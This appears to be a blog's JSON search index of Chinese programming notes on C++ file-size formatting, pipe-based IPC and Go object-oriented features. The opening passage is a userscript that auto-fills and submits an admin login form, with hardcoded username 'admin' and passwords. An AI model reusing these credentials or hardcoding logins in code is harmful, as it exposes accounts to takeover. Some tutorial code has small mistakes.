document.getElementsByName(&quot;username&quot;)[0].value = &#x27;admin&#x27;; document.getElementsByName(&quot;password&quot;)[0].value = &#x27;Admin@2022&#x27;; document.getElementsByName(&quot;username&quot;)[0].dispatchEvent(new InputEvent(&quot;input&quot;)) document.getElementsByName(&quot;password&quot;)[0].dispatchEvent(new InputEvent(&quot;input&quot;)) document.getElementsByTagName(&quot;button&quot;)[0].click() &#125;,200) &#125; else if(window.location.pathname==&#x27;/tap/admin/dist/login&#x27;)&#123; setTimeout(()=&gt;&#123; document.getElementsByName(&quot;username&quot;)[0].value = &#x27;admin&#x27;; document.getElementsByName(&quot;password&quot;)[0].value = &#x27;admin@1234&#x27;; document.getElementsByName(&quot;username&quot;)[0].dispatchEvent(new InputEvent(&quot;input&quot;)) document.getElementsByName(&quot;password&quot;)[0].dispatchEvent(new InputEvent(&quot;input&quot;)) document.getElementsByTagName(&quot;button&quot;)[0].click() &#125;,200) &#125;&#125;,1000) &#125; // Your code here...&#125;)();","tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Python","slug":"B-Code/Python","permalink":"http://example.com/categories/B-Code/Python/"}]},{"title":"文件大小换算方法","date":"2023-10-27T01:24:02.216Z","path":"B_Code/LeetCode/ConvertFileSize/","text":"文件大小转换方法1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;using namespace std;string convertSize(double size)&#123; string strSize[6] = &#123; &quot;B&quot;, &quot;KB&quot;, &quot;MB&quot;, &quot;GB&quot;, &quot;TB&quot;, &quot;PB&quot; &#125;; unsigned int flag = 1024; for (int i = 0; i &lt; _countof(strSize); i++) &#123; if ((size / flag) &lt; 1) &#123; char strTemp[1024]; string strRet; sprintf_s(strTemp, &quot;%.2f&quot;, size); return strRet.append(strTemp).append(strSize[i]); &#125; else &#123; size = size / flag; &#125; &#125; return &quot;&quot;;&#125;int main()&#123; std::cout &lt;&lt; &quot;Hello World!\\n&quot;; double FlieSize_1 = 224945; double FlieSize_2 = 2249450; double FlieSize_3 = 2249450000; cout &lt;&lt; &quot;FlieSize_1：&quot; &lt;&lt; convertSize(FlieSize_1) &lt;&lt; endl; cout &lt;&lt; &quot;FlieSize_2：&quot; &lt;&lt; convertSize(FlieSize_2) &lt;&lt; endl; cout &lt;&lt; &quot;FlieSize_3：&quot; &lt;&lt; convertSize(FlieSize_3) &lt;&lt; endl; &#125;","tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"Demo","slug":"Demo","permalink":"http://example.com/tags/Demo/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"LeetCode","slug":"B-Code/LeetCode","permalink":"http://example.com/categories/B-Code/LeetCode/"}]},{"title":"【管道】（一） 初识管道","date":"2023-10-27T01:24:02.215Z","path":"B_Code/IPC/初识管道/","text":"[toc] 自己的理解， 首先要区分概念：管道和管道通信 所谓“管道”，是指用于连接一个读进程和一个写进程以实现它们之间通信的一个共享文件，又名pipe文件 （是一种特殊的文件，这就意味着你可以向操作文件一样操作无名管道，无名管道在内核中对应的是一段特殊的内存空间，这段内存空间由操作系统进行管理，对用户是不可见的，在用户空间的应用程序中只能通过系统调用来访问它。在这段内存空间中以循环队列的方式来临时存储一个进程发往另外一个进程的信息，并且在通信完成后就会自动释放相应的空间。） 而管道通信是消息传递的一种特殊方式。 即管道是文件，是服务于管道通信的特殊文件，而管道通信是一种通信方式，这种通信方式比较特殊，是半双工的通信方式，即数据只能单向流动，数据传递的方式是字符流形式，它一般是应用在具有共同祖先的进程间使用。 管道通信是什么？ 用于进程之间通信的一种通信方式。 管道通信有哪些特点？ 半双工的通信方式，数据只能单向流动，数据传递的方式是字符流形式。 管道通信的应用场合？ 具有共同祖先的进程间使用。 1、什么是管道管道：—就像现实中的水管，水就像数据。（连接进程，相当于在进程间连接一个通路，用来传递信息）—管道是一种半双工的通信方式—数据只能单向流动，而且只能在具有共同祖先的进程间使用。 所谓半双工的模式 （假设通信双方是甲方和乙方，双工通信方式的意思是甲可以向乙发送数据，乙也可以向甲发送数据，即数据流通是双向的。而半双工的通信方式是指甲乙两方不能同时向对方发送数据，也就是甲向乙发送数据时，乙只能接收不能发送，而乙向甲发送数据时，甲只能接收不能向乙发送数据） 举个例子：形象来说类似一个单刀双掷开关，有两个选择，但是二者是互斥的，当选择了一方另一方就失效。而对于此处的管道，可以把它想成是管道的一端，一次只能调用一种功能读入或者写入，二者也是互斥的。 管道通信是消息传递的一种特殊方式，管道机制必须提供以下三方面的协调能力：互斥、同步和确定对方的存在。 2、为什么要有管道在一个多进程操作系统所提供的运行环境下，可以通过两种不同的途径或者说采用两种不同的策略，来建立起复杂的大型应用系统。一种途径就是通过一个孤立的,大型的，复杂的进程提供所需的全部服务，另外一种途径就是通过由若干相互联系的，小型的。相对简单的进程构成的组合来提供所需的功能。早期的操作系统往往倾向与前者，而Unix以及其衍生的各种操作系统往往倾向于后者。相比之下，后者有着各种好处：1.模块化，2.各个进程都得到保护，在相当程度上排除了相互干扰的可能性，3.灵活性更强。当然这种好处也是要付出代价的，也有缺点，但是相比之下，这种途径的优点远远超出了其缺点。Unix（从而Linux）向应用软件提供了一些进程间通信的手段，早期的Unix提供了：管道（pipe），信（signal），跟踪（trace）。 进程之间的通信，从物理上分，可以分为同主机的进程之间的通信和不同主机间的进程之间的通信。从通信内容方式上分，可以分为数据交互、同步通信、异步通信。 Linux 教程 系统进程之间的通信方式大致如下图所示 集合上述两种从物理和内容方式的划分，可以这样理解上图： （1）同主机进程间数据交互机制：无名管道（PIPE）、有名管道（FIFO）、消息队列（Message Queue）和共享内存（Shared Memory）。 （2）同主机进程间同步通信机制：信号量（Semaphore）。 （3）同主机进程间异步通信机制：信号（Signal）。 （4）不同主机间进程数据交互机制：套接字（Socket）、远程调用RPC（Remote Procedure Call）。 管道通信 管道又可以分为无名管道和命名管道，两者的用途是不一样的。 无名管道PIPE：主要用于具有亲缘关系的进程之间的通信，无名管道的通信是单向的，只能由一段到另外一段；无名管道是临时性的，完成通信后将自动消失。一般采用先创建无名管道，再创建子进程，使子进程继承父进程的管道文件描述符，从而实现父子进程间的通信；在非亲缘关系管道之间，如果想利用无名管道进行通信，则需要借助另外的文件描述符传递机制。 有名管道FIFO：有名管道是一个实际存在的特殊文件，利用有名管道可以实现同主机任意进程之间的数据交互。 无名管道是一种特殊的文件，这就意味着你可以向操作文件一样操作无名管道，无名管道在内核中对应的是一段特殊的内存空间，这段内存空间由操作系统进行管理，对用户是不可见的，在用户空间的应用程序中只能通过系统调用来访问它。在这段内存空间中以循环队列的方式来临时存储一个进程发往另外一个进程的信息，并且在通信完成后就会自动释放相应的空间。 即无名管道主要用于具有亲缘关系的父子进程之间的通信，是临时性的，需要先创建管道，再创建子进程；管道都是单向的，若要实现双向通信，则需要两个管道。命名管道是实际存在的文件，使用前需要先打开，管道默认的read和write操作都是阻塞式的。 3、如何建立进程间管道？这里我们只谈管道：父进程与子进程，或者两个兄弟进程之间，可以通过系统调用建立起一个单向的通信管道。但是，这种管道只能由父进程来建立，所以对于子进程来说是静态的，与生俱来的。管道两端的进程各自将该管道视作一个文件。一个进程往通道中写的内容由另一个进程从通道读出，通过通道传递的内容遵循“先入先出”（FIFO）的规则。每个通道都是单向的，需要双向通信时要建立起两个通道。 下面说一说进程间管道的建立，在这之前我们要说到fork()函数，在Linux系统中一个新的进程是由一个已经存在的进程“复制”出来的，而不是“创造”出来的（而所谓的“创建”实际上就是复制）。管道机制的主体是系统调用pipe()，但是由pipe（）所建立的管道的两端都在同一个进程中，这样的管道起不到进程间通信的作用。所以必须在fork（）的配合下，才能在父子进程间或者两个子进程之间建立起进程间的通信管道。 下面就介绍一下怎样将管道用于进程间通信：（1）进程A创建了一个管道，创建完成时代表管道两端的两个已打开文件都在进程A中。 (2)进程A通过frok（）创建出进程B，在fork（）的过程中进程A的打开文件表按原样复制到进程B中。 (3)进程A关闭管道的读端，而进程B关闭管道的写段。于是，管道的写段在进程A中而读端在进程B中，成为了父子进程之间的通信管道。 (4)进程A又通过frok（）创建进程C，而后关闭其管道写段而与管道脱离关系，使得管道的写段在进程C中而读端在进程B中，成为两个兄弟进程之间的管道。 人们在认识到管道机制也存在一些缺点和不足。由于管道是一种“无名”，“无形”的文件，它可以通过fork（）的过程创建于“近亲” 的进程之间，而不能成为可以在任意两个进程之间建立通信的机制，更不可能成为一种一般的，通用的进程间通信模型，同时，管道机制的这种缺点本身强烈的暗示着人们，只要用“有名”，“有形”的文件来实现管道，就能克服这种缺点。所以有了管道之后，“命名管道”的出现时必然的。为了实现“命名管道”，在“普通文件”，“块设备文件”，“字符设备文件”之外，又设立了一种文件类型，称为FIFO文件。对这种文件的访问严格遵循“先进先出”的原则。这样就可以像在磁盘上建立一个文件一样建立一个命名管道，具体可以使用命令mknod来建立。 函数介绍：¢int read(intfd, void *buf, int count);—功能：从参数fd指定的读端读取管道数据到大小为count的缓存buf中，返回实际读取到的字节数。—参数¢fd:管道读端¢buf:缓存区，保存读到的数据¢count:读取字节数 •intwrite(intfd, void *buf, intcount);•功能：向参数fd指定的写端从缓存buf中取出count个字节到管道中，返回值为实际写入的字节数。 •参数•fd:管道写端•buf:缓存区，将要写入管道的数据•count:写入的字节数 参考来源： http://blog.csdn.net/followingturing/article/details/6071937 ​ http://c.biancheng.net/cpp/html/2592.html ​ http://www.2cto.com/os/201410/343247.html","tags":[{"name":"《深入理解Windows操作系统》","slug":"《深入理解Windows操作系统》","permalink":"http://example.com/tags/%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%8B/"},{"name":"IPC","slug":"IPC","permalink":"http://example.com/tags/IPC/"},{"name":"Pipe","slug":"Pipe","permalink":"http://example.com/tags/Pipe/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"IPC","slug":"B-Code/IPC","permalink":"http://example.com/categories/B-Code/IPC/"}]},{"title":"【管道】（二） 管道通信","date":"2023-10-27T01:24:02.214Z","path":"B_Code/IPC/使用管道通信/","text":"本文所讲管道通信主要是进程间管道通信。 [toc] 管道 命名管道的通信是在一个命名管道服务器和一个命名管道客户之间进行的。命名管道服务器是指创建爱你命名管道的应用程序，客户可以连接到它所创建的命名管道上。命名管道的 名称的格式 是 \\\\Server\\pipe\\PipeName。 名称中的Server部分指定了此命名管道服务器当前执行所在的计算机（需要注意的是：命名管道服务器不能创建远程系统上的命名管道）。但是这个名称可以是一个DNS名称（比如，mspress.microsoft.com）、一个NetBIOS名称（mspress）或者一个IP地址（131.107.0.1）。 名称中的 Pipe 部分必须是字符串 Pipe。而 PipeName 则是分配给此命名管道的唯一名。命名管道名称中的唯一名部分可以包含子目录。如：\\\\MyComputer\\Pipe\\MyServerApp\\ConnectionPipe 是一个包含子目录的命名管道名称的例子。 综上，我们在一个示例程序中创建的管道可以命名为 \\\\.\\pipe\\DemoApp\\test.pip （使用转义也就是\\\\\\\\.\\\\pipe\\\\DemoApp\\\\test_pip），这里的 \\ 代表的是本地计算机。 而以上的管道名，也就是我们后续调用API的参数之一，也是我们唯一可以标识管道的标志。 创建管道的方式一 CreateNamedPipe原型12345678910HANDLE CreateNamedPipeA( [in] LPCSTR lpName, [in] DWORD dwOpenMode, [in] DWORD dwPipeMode, [in] DWORD nMaxInstances, [in] DWORD nOutBufferSize, [in] DWORD nInBufferSize, [in] DWORD nDefaultTimeOut, [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes); 参数说明 lpName要创建的管道名。 dwOpenMode dwPipeMod nMaxInstances nOutBufferSize nInBufferSize nDefaultTimeOut lpSecurityAttributes 用法创建管道的方式二 CreateFile原型1 参数说明用法Demo1——管道客户端和服务端的控制台程序Demo2——管道类知识来源： 《深入解析Windows操作系统》 Qt笔记-Windows管道通信_IT1995的博客-CSDN博客_qt管道通信 多进程通信之管道demo_Sunbigwang的博客-CSDN博客_多进程管道","tags":[{"name":"《深入理解Windows操作系统》","slug":"《深入理解Windows操作系统》","permalink":"http://example.com/tags/%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%8B/"},{"name":"IPC","slug":"IPC","permalink":"http://example.com/tags/IPC/"},{"name":"Pipe","slug":"Pipe","permalink":"http://example.com/tags/Pipe/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"IPC","slug":"B-Code/IPC","permalink":"http://example.com/categories/B-Code/IPC/"}]},{"title":"Go——Wails经验整理","date":"2023-10-27T01:24:02.210Z","path":"B_Code/GO/wailsapp/wails经验整理/","text":"","tags":[{"name":"Go","slug":"Go","permalink":"http://example.com/tags/Go/"},{"name":"Wails","slug":"Wails","permalink":"http://example.com/tags/Wails/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"wailsapp","slug":"B-Code/GO/wailsapp","permalink":"http://example.com/categories/B-Code/GO/wailsapp/"}]},{"title":"","date":"2023-10-27T01:24:02.210Z","path":"B_Code/GO/wailsapp/todo/todo/","text":"","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"wailsapp","slug":"B-Code/GO/wailsapp","permalink":"http://example.com/categories/B-Code/GO/wailsapp/"},{"name":"todo","slug":"B-Code/GO/wailsapp/todo","permalink":"http://example.com/categories/B-Code/GO/wailsapp/todo/"}]},{"title":"Go面向对象编程1——面向对象编程","date":"2023-10-27T01:24:02.204Z","path":"B_Code/GO/Go简明手册/面向对象编程/面向对象编程/README/","text":"Go 语言的代码是以包结构来组织的，且如果标示符（变量名，函数名，自定义类型等）如果以大写字母开头那么这些标示符是可以导出的，可以在任何导入了定义该标示符的包的包中直接使用。Go 语言中的面向对象和 C++，Java 中的面向对象不同，因为 Go 语言不支持继承，Go 语言只支持组合。 自定义类型Go 语言的中结构体 struct 与 C++、JAVA 中的类 class 相似，但 Go 放弃了传统面向对象的诸多特性，只保留了组合。 type typeName typeSpecification 其中，typeName 可以是一个包或者函数内唯一合法的 Go 标示符。typeSpecification 可以是任何内置的类型，一个接口或者是一个结构体。所谓结构体，它的字段是由其他类型或者接口组成。例如我们通过结构体定义了一下类型： 1234type ColorPoint struct &#123; color.Color // 匿名字段(嵌入) x, y int // 具名字段(聚合)&#125; 以上代码我们通过结构体自定义了类型 ColorPoint，结构体中 color.Color 字段是 Color 包的类型 color，这个字段没有名字，所以被称为匿名的，也是嵌入字段。字段 x 和 y 是有变量名的，所以被称为具名字段。假如我们创建了类型 ColorPoint 的一个值 point（通过语法：point := ColorPoint&#123;&#125; 创建），那么这些字段可以通过 point.Color、point.x、point.y 访问。其他面向对象语言中的”类 (class)”、”对象 (object)”、”实例 (instance)”在 Go 语言中我们完全避开使用。相反的我们使用”类型 (type)”和其对应的”值”，其中自定义类型的值可以包含方法。 定义了结构体后如何创建并初始化一个对象实例呢？Go 语言支持以下几种方法进行实现： 12345678910//先定义一个结构体Mantype Man struct&#123; name string age int&#125;//对象创建与初始化man := new(Man)man := &amp;Man&#123;&#125;man := &amp;Man&#123;&quot;Tom&quot;, 18&#125;man := &amp;Man&#123;name: &quot;Tom&quot;, age: 18&#125; 为了更加方便的创建对象，我们一般会使用一个全局函数来完成对象的创建，这和传统的“构造函数”类似。 123func NewMan(name string, age int) *Man &#123; return &amp;Man&#123;name, age&#125;&#125;","tags":[{"name":"Go简明手册","slug":"Go简明手册","permalink":"http://example.com/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"面向对象编程","slug":"B-Code/GO/Go简明手册/面向对象编程","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"},{"name":"面向对象编程","slug":"B-Code/GO/Go简明手册/面向对象编程/面向对象编程","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"}]},{"title":"Go面向对象编程3——组合","date":"2023-10-27T01:24:02.203Z","path":"B_Code/GO/Go简明手册/面向对象编程/组合/README/","text":"Go 语言虽然抛弃了继承，但是却提供了一个更加方便的组合特性。相对于继承的编译期确定实现，组合的运行态指定实现，更加灵活。下面通过一段代码来了解组合的基本属性以及它与继承的不同之处。 先定义一个结构体 Base, 并为它添加两个方法 Foo() 和 Bar()： 1234567891011121314151617type Base struct&#123; Name string&#125;func (b *Base) Foo() &#123;...&#125;func (b *Base) Bar() &#123;...&#125;type Seed struct &#123; Base ...&#125;func (s *Seed) Foo() &#123; s.Base.Foo() s.Bar() ...&#125; 上面代码先定义了一个 Base 类，然后定义了一个 Seed 类。Seed 类“继承”了 Base 类的所有成员属性和方法并重写了 Foo() 方法。同时在重写 Foo() 方法时调用了 Base 类的 Foo() 方法和 Bar() 方法。需要注意的是，若此时 Seed 的对象通过 s.Foo() 调用 Foo() 方法时，实际调用的是 Seed 重写过后的 Foo() 方法，而不是基类 Base 的 Foo() 方法，若想调用 Base 类的 Foo() 方法则要使用 s.Base.Foo，而调用没有重写的 Bar() 方法时，使用 s.Bar() 和s.Base.Bar() 效果是一样的。","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"面向对象编程","slug":"B-Code/GO/Go简明手册/面向对象编程","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"},{"name":"组合","slug":"B-Code/GO/Go简明手册/面向对象编程/组合","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/%E7%BB%84%E5%90%88/"}]},{"title":"Go面向对象编程2——方法","date":"2023-10-27T01:24:02.200Z","path":"B_Code/GO/Go简明手册/面向对象编程/方法/README/","text":"Demo 方法 方法是作用在自定义类型上的一类特殊函数，通常自定义类型的值会被传递给该函数，该值可能是以指针或者复制值的形式传递。定义方法和定义函数几乎相同，只是需要在 func 关键字和方法名之间必须写上接接受者。例如我们给类型 Count 定义了以下方法： 12345type Count intfunc (count *Count) Increment() &#123; *count++ &#125; // 接受者是一个 `Count` 类型的指针func (count *Count) Decrement() &#123; *count-- &#125;func (count Count) IsZero() bool &#123; return count == 0 &#125; 以上代码中，我们在内置类型 int 的基础上定义了自定义类型 Count，然后给该类型添加了 Increment()、Decrement() 和 IsZero() 方法，其中前两者的接受者为 Count 类型的指针，后一个方法接收 Count 类型的值。 Demo: 类型的方法集是指可以被该类型的值调用的所有方法的集合。 一个指向自定义类型的值的指针，它的方法集由该类型定义的所有方法组成，无论这些方法接受的是一个值还是一个指针。如果在指针上调用一个接受值的方法，Go 语言会聪明地将该指针解引用。 一个自定义类型值的方法集合则由该类型定义的接收者为值类型的方法组成，但是不包括那些接收者类型为指针的方法。 其实这些限制 Go 语言帮我们解决的非常好，结果就是我们可以在值类型上调用接收者为指针的方法。假如我们只有一个值，仍然可以调用一个接收者为指针类型的方法，这是因为 Go 语言会自动获取值的地址传递给该方法，前提是该值是可寻址的。 在以上定义的类型 Count 中，*Count 方法集是 Increment(), Decrement() 和 IsZero()，Count 的值的方法集是 IsZero()。但是因为 Count 类型的是可寻址的，所以我们可以使用 Count 的值调用全部的方法。 另外如果结构体的字段也有方法，我们也可以直接通过结构体访问字段中的方法。下面让我们练习下，创建源文件 struct_t.go，输入以下代码： 123456789101112131415161718192021222324252627282930313233343536package mainimport &quot;fmt&quot;type Count int // 创建自定义类型 Countfunc (count *Count) Increment() &#123; *count++ &#125; // Count类型的方法func (count *Count) Decrement() &#123; *count-- &#125;func (count Count) IsZero() bool &#123; return count == 0 &#125;type Part struct &#123; // 基于结构体创建自定义类型 Part stat string Count // 匿名字段&#125;func (part Part) IsZero() bool &#123; // 覆盖了匿名字段Count的IsZero()方法 return part.Count.IsZero() &amp;&amp; part.stat == &quot;&quot; // 调用了匿名字段的方法&#125;func (part Part) String() string &#123; // 定义String()方法，自定义了格式化指令%v的输出 return fmt.Sprintf(&quot;&lt;&lt;%s, %d&gt;&gt;&quot;, part.stat, part.Count)&#125;func main() &#123; var i Count = -1 fmt.Printf(&quot;Start \\&quot;Count\\&quot; test:\\nOrigin value of count: %d\\n&quot;, i) i.Increment() fmt.Printf(&quot;Value of count after increment: %d\\n&quot;, i) fmt.Printf(&quot;Count is zero t/f? : %t\\n\\n&quot;, i.IsZero()) fmt.Println(&quot;Start: \\&quot;Part\\&quot; test:&quot;) part := Part&#123;&quot;232&quot;, 0&#125; fmt.Printf(&quot;Part: %v\\n&quot;, part) fmt.Printf(&quot;Part is zero t/f? : %t\\n&quot;, part.IsZero()) fmt.Printf(&quot;Count in Part is zero t/f?: %t\\n&quot;, part.Count.IsZero()) // 尽管覆盖了匿名字段的方法，但还是可以访问&#125; 以上代码中，我们创建了 Count 类型，然后在其基础上又创建了结构体类型 Part。我们为 Count 类型定义了 3 个方法，并在 Part 类型中创建了方法 IsZero() 覆盖了其匿名字段 Count 中 IsZero() 方法。但是我们还是可以二次访问到匿名字段中被覆盖的方法。执行代码，输出如下： 123456789101112$ go run struct_t.goStart &quot;Count&quot; test:Origin value of count: -1Value of count after increment: 0Count is zero t/f? : trueStart: &quot;Part&quot; test:Part: &lt;&lt;232, 0&gt;&gt;Part is zero t/f? : falseCount in Part is zero t/f?: true","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"面向对象编程","slug":"B-Code/GO/Go简明手册/面向对象编程","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"},{"name":"方法","slug":"B-Code/GO/Go简明手册/面向对象编程/方法","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/%E6%96%B9%E6%B3%95/"}]},{"title":"Go面向对象编程5——接口变量值的类型","date":"2023-10-27T01:24:02.197Z","path":"B_Code/GO/Go简明手册/面向对象编程/接口变量值的类型/README/","text":"Demo 接口在 Go 中，接口是一组方法签名。当一个类型为接口中的所有方法提供定义时，它被称为实现该接口。它与 oop 非常相似。接口指定类型应具有的方法，类型决定如何实现这些方法。 接口基础之所以说 Go 语言的面向对象很灵活，很大一部分原因是由于接口的存在。接口是一个自定义类型，它声明了一个或者多个方法签名，任何实现了这些方法的类型都实现这个接口。infterface&#123;&#125; 类型是声明了空方法集的接口类型。任何一个值都满足 interface&#123;&#125; 类型，也就是说如果一个函数或者方法接收 interface&#123;&#125; 类型的参数，那么任意类型的参数都可以传递给该函数。接口是完全抽象的，不能实例化。接口能存储任何实现了该接口的类型。直接看例子吧，创建源文件 interface_t.go，输入以下代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package mainimport &quot;fmt&quot;type Human struct &#123; // 结构体 name string age int phone string&#125;//Human实现SayHi方法func (h Human) SayHi() &#123; fmt.Printf(&quot;Hi, I am %s you can call me on %s\\n&quot;, h.name, h.phone)&#125;//Human实现Sing方法func (h Human) Sing(lyrics string) &#123; fmt.Println(&quot;La la la la...&quot;, lyrics)&#125;type Student struct &#123; Human //匿名字段 school string loan float32&#125;type Employee struct &#123; Human //匿名字段 company string money float32&#125;// Employee重载Human的SayHi方法func (e Employee) SayHi() &#123; fmt.Printf(&quot;Hi, I am %s, I work at %s. Call me on %s\\n&quot;, e.name, e.company, e.phone)&#125;// Interface Men被Human,Student和Employee实现// 因为这三个类型都实现了这两个方法type Men interface &#123; SayHi() Sing(lyrics string)&#125;func main() &#123; mike := Student&#123;Human&#123;&quot;Mike&quot;, 25, &quot;222-222-XXX&quot;&#125;, &quot;MIT&quot;, 0.00&#125; paul := Student&#123;Human&#123;&quot;Paul&quot;, 26, &quot;111-222-XXX&quot;&#125;, &quot;Harvard&quot;, 100&#125; sam := Employee&#123;Human&#123;&quot;Sam&quot;, 36, &quot;444-222-XXX&quot;&#125;, &quot;Golang Inc.&quot;, 1000&#125; Tom := Employee&#123;Human&#123;&quot;Tom&quot;, 37, &quot;222-444-XXX&quot;&#125;, &quot;Things Ltd.&quot;, 5000&#125; //定义Men类型的变量i var i Men //i能存储Student i = mike fmt.Println(&quot;This is Mike, a Student:&quot;) i.SayHi() i.Sing(&quot;November rain&quot;) //i也能存储Employee i = Tom fmt.Println(&quot;This is Tom, an Employee:&quot;) i.SayHi() i.Sing(&quot;Born to be wild&quot;) //定义了slice Men fmt.Println(&quot;Let&#x27;s use a slice of Men and see what happens&quot;) x := make([]Men, 3) //这三个都是不同类型的元素，但是他们实现了interface同一个接口 x[0], x[1], x[2] = paul, sam, mike for _, value := range x &#123; value.SayHi() &#125;&#125; 接口变量值的类型* 接口类型声明的变量里能存储任何实现了该接口的类型的值。 有的时候我们需要知道这个变量里的值的类型，那么需要怎么做呢？可以使用类型断言，或者是 switch 类型判断分支。以下的例子 interface_t1.go 我们使用了 switch 类型判断分支。 123456789101112131415161718192021222324252627282930313233343536373839404142/*使用了switch 类型判断分支*/package mainimport ( &quot;fmt&quot; &quot;strconv&quot;)type Element interface&#123;&#125;type List []Elementtype Person struct &#123; name string age int&#125;// 实现了fmt.Stringer接口func (p Person) String() string &#123; return &quot;(name: &quot; + p.name + &quot;- age: &quot; + strconv.Itoa(p.age) + &quot; years)&quot;&#125;func main() &#123; list := make(List, 4) list[0] = 1 list[1] = &quot;Hello&quot; list[2] = Person&#123;&quot;Dennis&quot;, 70&#125; list[3] = 1 + 2i for index, element := range list &#123; switch value := element.(type) &#123; case int: fmt.Printf(&quot;list[%d] is an int and its value is %d\\n&quot;, index, value) case string: fmt.Printf(&quot;list[%d] is an int and its value is %s\\n&quot;, index, value) case Person: fmt.Printf(&quot;list[%d] is an int and its value is %s\\n&quot;, index, value) default: fmt.Printf(&quot;list[%d] is of a different type&quot;, index) &#125; &#125;&#125; 嵌入interface结构体中可以嵌入匿名字段，其实在接口里也可以再嵌入接口。如果一个 interface1 作为 interface2 的一个嵌入字段，那么 interface2 隐式的包含了 interface1 里的方法。如下例子中，Interface2 包含了 Interface1 的所有方法。 123456789type Interface1 interface &#123; Send() Receive()&#125;type Interface2 interface &#123; Interface1 Close()&#125;","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"面向对象编程","slug":"B-Code/GO/Go简明手册/面向对象编程","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"},{"name":"接口变量值的类型","slug":"B-Code/GO/Go简明手册/面向对象编程/接口变量值的类型","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/%E6%8E%A5%E5%8F%A3%E5%8F%98%E9%87%8F%E5%80%BC%E7%9A%84%E7%B1%BB%E5%9E%8B/"}]},{"title":"Go面向对象编程4——接口","date":"2023-10-27T01:24:02.195Z","path":"B_Code/GO/Go简明手册/面向对象编程/接口/README/","text":"Demo 接口在 Go 中，接口是一组方法签名。当一个类型为接口中的所有方法提供定义时，它被称为实现该接口。它与 oop 非常相似。接口指定类型应具有的方法，类型决定如何实现这些方法。 接口基础之所以说 